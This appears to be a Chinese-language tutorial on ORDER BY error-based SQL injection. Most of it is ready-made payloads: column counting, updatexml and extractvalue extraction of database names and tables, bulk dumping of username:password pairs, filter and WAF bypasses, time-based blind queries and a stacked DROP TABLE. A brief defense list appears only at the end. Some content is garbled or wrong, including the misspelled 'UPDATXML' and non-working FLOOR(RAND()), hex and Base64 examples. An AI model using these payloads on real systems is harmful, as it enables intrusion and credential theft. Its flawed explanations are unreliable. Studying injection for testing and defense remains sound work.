# SQL注入之报错注入 - ORDER BY

## 概述

ORDER BY在SQL注入中主要用于判断列数，但在报错注入中也可以利用其特性来触发数据库错误，从而获取敏感信息。

## ORDER BY基本原理

### 1. 判断列数
使用ORDER BY判断查询结果的列数：

```sql
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
' ORDER BY 4-- 
```

当ORDER BY后的数字超过实际列数时，会报错：
```
Unknown column '5' in 'order clause'
```

### 2. 报错注入技巧

#### MySQL报错注入
利用ORDER BY结合报错函数：

```sql
' ORDER BY 1,updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- 
' ORDER BY 1,extractvalue(1,concat(0x7e,(SELECT user()),0x7e))-- 
```

#### PostgreSQL报错注入
```sql
' ORDER BY 1,CAST((SELECT version()) AS INT)-- 
```

#### SQL Server报错注入
```sql
' ORDER BY 1,CONVERT(INT,(SELECT DB_NAME()))-- 
```

## 实战示例详解

### 场景1：基本列数判断

```sql
# 逐步测试确定列数
1' ORDER BY 1--    # 正常返回，至少有1列
1' ORDER BY 2--    # 正常返回，至少有2列  
1' ORDER BY 3--    # 正常返回，至少有3列
1' ORDER BY 4--    # 报错！说明只有3列
```

**错误信息分析：**
```
Unknown column '4' in 'order clause'
```
- 这告诉我们查询语句中的SELECT部分只有3列
- 后续的UNION注入也需要匹配3列

### 场景2：MySQL报错注入逐步解析

#### 步骤1：获取基础信息
```sql
# 获取当前数据库名
' ORDER BY 1,updatexml(1,concat(0x7e,database(),0x7e),1)-- 
```
**代码解析：**
- `database()` - 返回当前数据库名
- `concat(0x7e,database(),0x7e)` - 构造`~数据库名~`
- 预期错误：`XPATH syntax error: '~test_db~'`

```sql
# 获取数据库版本
' ORDER BY 1,updatexml(1,concat(0x7e,version(),0x7e),1)-- 
```
**代码解析：**
- `version()` - 返回MySQL版本信息
- 帮助判断数据库类型和版本，选择合适的注入技术

#### 步骤2：枚举表结构
```sql
# 获取第一个表名
' ORDER BY 1,updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e),1)-- 
```
**代码解析：**
- `information_schema.tables` - MySQL系统表，存储所有表信息
- `table_schema=database()` - 限定为当前数据库的表
- `LIMIT 1` - 只获取第一个表名
- 如果要获取第二个表名，用`LIMIT 1,1`

```sql
# 获取指定表的列名
' ORDER BY 1,updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),0x7e),1)-- 
```
**代码解析：**
- `information_schema.columns` - 系统表，存储所有列信息
- `table_name='users'` - 指定要查询的表
- 逐步枚举所有列名

#### 步骤3：提取敏感数据
```sql
# 获取用户名
' ORDER BY 1,updatexml(1,concat(0x7e,(SELECT username FROM users LIMIT 1),0x7e),1)-- 

# 获取密码
' ORDER BY 1,updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1),0x7e),1)-- 
```
**代码解析：**
- 直接从目标表中查询数据
- `LIMIT 1` 获取第一条记录
- 可以用`LIMIT n,1`获取第n条记录

### 场景3：结合UNION的高级注入

#### 步骤1：确定UNION列数
```sql
' ORDER BY 3--        # 确定3列
' UNION SELECT 1,2,3-- # 测试UNION语法正确性
```

#### 步骤2：利用UNION+报错注入
```sql
' UNION SELECT 1,updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),3)-- 
```
**代码解析：**
- `GROUP_CONCAT(table_name)` - 将所有表名连接为一个字符串
- 比逐个查询更高效，但要注意长度限制
- 在第二个位置进行报错注入

#### 步骤3：批量数据提取
```sql
' UNION SELECT 1,updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(username,':',password) FROM users),0x7e),3)-- 
```
**代码解析：**
- `GROUP_CONCAT(username,':',password)` - 将用户名和密码配对连接
- 一次性获取所有用户凭证
- 注意：如果数据太多可能会被截断

### 场景4：绕过长度限制的技巧

当报错信息被截断时，使用substring和limit分段获取：

```sql
# 获取前100个字符
' ORDER BY 1,updatexml(1,concat(0x7e,SUBSTRING((SELECT password FROM users WHERE id=1),1,100),0x7e),1)-- 

# 获取100-200个字符
' ORDER BY 1,updatexml(1,concat(0x7e,SUBSTRING((SELECT password FROM users WHERE id=1),100,100),0x7e),1)-- 
```

**代码解析：**
- `SUBSTRING(string, start, length)` - 截取字符串的一部分
- 通过多次调用获取完整的长字段数据
- 常用于获取密码哈希、长文本等

## 报错函数详解

### 1. UPDATXML() - XML更新函数

#### 函数语法
```sql
UPDATXML(xml_target, xpath_expr, new_xml)
```

#### 代码原理解析
```sql
' ORDER BY 1,updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- 
```

**详细解释：**
- `updatexml(1, ...)` - 第一个参数设为1，不关心XML内容
- `concat(0x7e,(SELECT database()),0x7e)` - 关键部分！
  - `0x7e` 是 `~` 的十六进制编码，作为分隔符
  - `(SELECT database())` - 执行子查询获取数据库名
  - 整个concat结果：`~数据库名~`
- `1` - 第三个参数设为1，不关心新XML值

**为什么能报错：**
```sql
-- 正常的XPath应该是：
updatexml(1, '/book/title', 'New Title')

-- 我们构造的是：
updatexml(1, '~test_database~', 1)
```
当第二个参数包含非法字符（如`~`）时，MySQL会报错并在错误信息中显示该内容，从而泄露数据。

#### 变体示例
```sql
# 获取版本信息
' ORDER BY 1,updatexml(1,concat(0x7e,version(),0x7e),1)-- 

# 获取当前用户
' ORDER BY 1,updatexml(1,concat(0x7e,user(),0x7e),1)-- 

# 获取表名
' ORDER BY 1,updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e),1)-- 
```

### 2. EXTRACTVALUE() - XML提取函数

#### 函数语法
```sql
EXTRACTVALUE(xml_frag, xpath_expr)
```

#### 代码原理解析
```sql
' ORDER BY 1,extractvalue(1,concat(0x7e,(SELECT user()),0x7e))-- 
```

**详细解释：**
- `extractvalue(1, ...)` - 第一个参数设为1，表示从XML文档"1"中提取
- `concat(0x7e,(SELECT user()),0x7e)` - 同样构造包含非法字符的XPath表达式

**工作原理：**
```sql
-- 正常用法：
EXTRACTVALUE('<book><title>MySQL</title></book>', '/book/title')
-- 返回：'MySQL'

-- 注入用法：
EXTRACTVALUE(1, '~root@localhost~')
-- 报错：XPATH syntax error: '~root@localhost~'
```

### 3. FLOOR() + RAND() + GROUP BY - 统计函数报错

#### 完整代码解析
```sql
' ORDER BY 1,(SELECT COUNT(*) FROM (SELECT 1 FROM information_schema.columns GROUP BY FLOOR(RAND()*2))a)-- 
```

**分层解析：**

1. **最内层：**
```sql
SELECT 1 FROM information_schema.columns GROUP BY FLOOR(RAND()*2)
```
   - `information_schema.columns` - 确保有足够多的行
   - `RAND()*2` - 生成0-2之间的随机数
   - `FLOOR(RAND()*2)` - 转换为0或1
   - 按随机值分组，会产生重复的group by key

2. **中间层：**
```sql
SELECT COUNT(*) FROM (...) a
```
   - 对重复分组进行计数

3. **外层与ORDER BY结合：**
```sql
' ORDER BY 1, (SELECT COUNT(*) FROM ...)--
```

**为什么能报错：**
- 当`RAND()`在GROUP BY中使用时，MySQL会抛出主键重复错误
- 错误信息可能包含统计信息，从而泄露数据

#### 变体示例
```sql
# 更简洁的版本
' ORDER BY 1,(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)a GROUP BY FLOOR(RAND()*2))--

# 结合数据查询
' ORDER BY 1,(SELECT COUNT(*) FROM (SELECT 1,table_name FROM information_schema.tables GROUP BY FLOOR(RAND()*2))a)--
```

### 4. 其他报错技巧

#### CAST/CONVERT类型转换错误
```sql
' ORDER BY 1,CAST((SELECT version()) AS INT)-- 
```
**原理：** 将字符串版本的数据库信息强制转换为整数，触发类型转换错误

#### 除零错误
```sql
' ORDER BY 1,(SELECT 1/(SELECT COUNT(*) FROM users WHERE id=1))--
```
**原理：** 当COUNT为0时产生除零错误

#### 数值溢出
```sql
' ORDER BY 1,EXP(~(SELECT * FROM (SELECT version())a))--
```
**原理：** `~`是位取反操作，`EXP()`函数的参数过大时溢出报错

## 绕过技巧详解

### 1. 绕过空格过滤

#### 注释绕过
```sql
'/**/ORDER/**/BY/**/1--
```
**原理解析：**
- `/**/` 在MySQL中是合法的多行注释，相当于空格
- 可以替代正常的空格字符
- 绕过简单的空格过滤规则

#### URL编码绕过
```sql
'%20ORDER%20BY%201--
```
**原理解析：**
- `%20` 是空格的URL编码
- 某些应用层过滤只检查原始输入，不进行URL解码
- 在到达数据库时已经被还原为空格

#### Tab和换行绕过
```sql
'%09ORDER%09BY%091--     # Tab制表符
'%0AORDER%0ABY%0A1--     # 换行符
'%0BORDER%0BBY%0B1--     # 垂直制表符
```

### 2. 绕过关键字过滤

#### 注释分割关键字
```sql
' ORDER/*by*/ 1--
' OR/**/DER/**/BY/**/1--
```
**原理解析：**
- 在关键字内部插入注释，如 `ORDER` → `OR/*comment*/DER`
- MySQL会忽略注释，执行时拼接为完整关键字
- 绕过基于完整字符串匹配的过滤

#### 大小写混合
```sql
' Order By 1--
' oRdEr bY 1--
' ORDER BY 1--
```
**原理解析：**
- MySQL关键字不区分大小写
- 部分过滤规则可能只检查小写形式

#### 双写绕过
```sql
' ORORDERDER BYBY 1--
```
**原理解析：**
- 某些过滤会将第一个ORDER替换为空
- 结果变成 `ORDER BY 1`
- 适用于只替换一次的简单过滤

### 3. 编码绕过

#### 十六进制编码
```sql
' ORDER BY 1--  =>  0x274f52444552204259202d2d
```
**应用方式：**
```sql
UNION SELECT 1,CONVERT(0x274f52444552204259202d2d USING utf8)-- 
```

#### Base64编码
```sql
' ORDER BY 1--  =>  JyBPUkRFUiBCWSAxLS0=
```
**应用方式：**
```sql
UNION SELECT 1,FROM_BASE64('JyBPUkRFUiBCWSAxLS0=')--
```

#### CHAR函数绕过
```sql
' ORDER BY 1--
=>
CONCAT(CHAR(39),CHAR(32),CHAR(79),CHAR(82),CHAR(68),CHAR(69),CHAR(82),CHAR(32),CHAR(66),CHAR(89),CHAR(32),CHAR(49),CHAR(45),CHAR(45))
```

### 4. 函数替代绕过

#### 使用函数构造关键字
```sql
# MID替代SUBSTRING
MID('string',1,3) = SUBSTRING('string',1,3)

# CONCAT_WS替代CONCAT
CONCAT_WS(':',user,password) = CONCAT(user,':',password)

# LOCATE替代POSITION/FIND_IN_SET
LOCATE('a','abc') = POSITION('a' IN 'abc')
```

#### 数学运算绕过
```sql
' ORDER BY (1+0)--
' ORDER BY 2*1--
' ORDER BY 3-0--
```

### 5. 时间盲注替代方案

当报错注入被完全禁用时，可以转换为时间盲注：

```sql
# 基于时间的数据获取
' AND IF((SELECT database())='test',SLEEP(5),0)-- 

# 结合二分法快速判断
' AND IF((SELECT ASCII(SUBSTRING(database(),1,1)))>100,SLEEP(5),0)-- 
```

### 6. 堆叠查询绕过

某些数据库支持堆叠查询，可以执行多条SQL语句：

```sql
'; SELECT * FROM users WHERE id=1-- 
'; DROP TABLE users--  (危险！)
```

**注意：**
- 堆叠查询需要特定权限
- 在实际环境中很少可用
- 主要在CTF比赛中出现

## 注意事项

1. **版本兼容性**：不同数据库版本的报错注入方法可能有差异
2. **权限限制**：部分报错函数需要特定权限
3. **日志记录**：报错注入会产生明显的错误日志
4. **WAF防护**：现代WAF通常能检测ORDER BY注入

## 防御建议

1. **参数化查询**：使用预处理语句
2. **输入验证**：严格验证用户输入
3. **错误处理**：自定义错误页面，隐藏数据库错误信息
4. **权限控制**：最小化数据库用户权限
5. **WAF部署**：部署Web应用防火墙

## 总结

ORDER BY报错注入是SQL注入的重要技术之一，既能用于列数判断，也能结合报错函数获取数据。掌握其原理和绕过技巧对于渗透测试和漏洞防护都具有重要意义。